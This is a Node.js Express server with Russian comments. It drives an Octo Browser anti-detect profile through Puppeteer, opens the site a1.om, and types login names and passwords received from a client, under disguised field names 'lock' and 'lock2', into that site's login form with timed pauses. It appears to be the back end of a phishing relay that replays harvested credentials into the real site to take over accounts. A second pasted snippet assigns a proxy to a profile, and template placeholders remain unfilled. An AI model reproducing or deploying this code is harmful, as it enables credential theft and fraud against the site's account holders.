const express = require('express');
const puppeteer = require('puppeteer');
const session = require('express-session');
const cors = require('cors');
const axios = require('axios');
 
const app = express();
const port = {id001};

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(session({
  secret: 'ваш-секретный-ключ',
  resave: false,
  saveUninitialized: true,
}));
app.use(cors());

// Глобальные переменные для хранения браузера и активной страницы
let browser = null;
let activePage = null;

// Функция для создания браузера и открытия страницы

const OCTO_REMOTE_API = axios.create({
  baseURL: 'https://app.octobrowser.net/api/v2/automation/',
  timeout: 2000,
  headers: {
    'X-Octo-Api-Token': 'api' //Put your Token here
  }
});
const OCTO_LOCAL_API = axios.create({
  baseURL: 'http://127.0.0.1:58888/api/profiles/',
  timeout: 1000
});

async function createProfile() {
  return OCTO_REMOTE_API.post(`/profiles`, {
    title: '{id002}',
    fingerprint: {
      os: "win"
    }
  }).then((response) => response.data).catch((error) => error.response ? error.response.data : null);
}

async function startProfile(uuid) {
  return OCTO_LOCAL_API.post('/start', {
    uuid: uuid,
    headless: false,
    debug_port: true
  }).then((response) => response.data).catch((error) => error.response ? error.response.data : null);
}

(async () => {
  try {
    const response = await createProfile();
    const profile_uuid = response.data.uuid;
    const start_response = await startProfile(profile_uuid);
    const ws_endpoint = start_response.ws_endpoint;
    const browser = await puppeteer.connect({
      browserWSEndpoint: ws_endpoint,
      defaultViewport: null
    });
    activePage = await browser.newPage();
    await activePage.goto('https://a1.om/');

    // Ваш остальной код обработки данных ...

  } catch (error) {
    console.error('Произошла ошибка при создании браузера:', error.message);
  }
})();

// Проверка, создан ли браузер и активная страница
async function ensureBrowserAndPage() {
  if (!browser || !activePage) {
    try {
      browser = await puppeteer.connect({ browserWSEndpoint: 'ws://localhost:58888/devtools/browser' });
      console.log('Браузер успешно подключен через OctoBrowser API');
      activePage = await browser.newPage();
    } catch (error) {
      console.error('Произошла ошибка при создании браузера:', error.message);
    }
  }
}

// Функция для задержки (паузы) в миллисекундах
function pause(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

app.post('/process-data', async (req, res) => {
  try {
    const requestData = req.body;
    console.log('Полученные данные от клиента:', requestData);

    await ensureBrowserAndPage();

    // Обработка данных для lock
    if (requestData.lock) {
      req.session.lock = requestData.lock;

      // Эмулируем нажатие на <input> с именем 'loginname'
      await activePage.evaluate(() => {
        const inputElement = document.querySelector('input[name="loginname"]');
        if (inputElement) {
          inputElement.focus();
        }
      });

      // Пауза ввода текста на 2 секунды
      await pause(2000);

      // Вводим данные в <input> с именем 'loginname'
      await activePage.keyboard.type(requestData.lock);

      // Нажимаем кнопку "Отправить" или выполняем другие действия
      await activePage.click('button[type="submit"]');
      console.log('Данные lock успешно отправлены');
    }

    // Обработка данных для lock2
    if (requestData.lock2) {
      req.session.lock2 = requestData.lock2;

      // Эмулируем нажатие на <input> с именем 'password'
      await activePage.evaluate(() => {
        const inputElement = document.querySelector('input[name="password"]');
        if (inputElement) {
          inputElement.focus();
        }
      });

      // Пауза ввода текста на 5 секунд
      await pause(5000);

      // Вводим данные в <input> с именем 'password'
      await activePage.keyboard.type(requestData.lock2);

      // Нажимаем кнопку "Отправить" или выполняем другие действия
      await activePage.click('button[type="submit"]');
      console.log('Данные lock2 успешно отправлены');
    }

    res.status(200).json({ message: 'Данные успешно обработаны' });
  } catch (error) {
    console.error('Произошла ошибка при обработке данных:', error.message);
    res.status(500).json({ error: 'Произошла ошибка при обработке данных' });
  }
});

app.listen(port, () => {
  console.log(`Сервер запущен на порту ${port}`);
});
















const axios = require('axios');
const data = {
  proxy: {
    uuid: 'uuidOfSavedProxy', //put UUID of saved proxy here
  }
}
const config = {
  method: 'patch',
  url: 'https://app.octobrowser.net/api/v2/automation/profiles/uuidOfProfile', //Put UUID of profile
  headers: {
    'Content-Type': 'application/json',
    'X-Octo-Api-Token': 'Token' //Put your Token here
  },
  data: data
};
axios(config)
  .then(function (response) {
    console.log(response.data);
  })
  .catch(function (error) {
    console.log(error);
  });

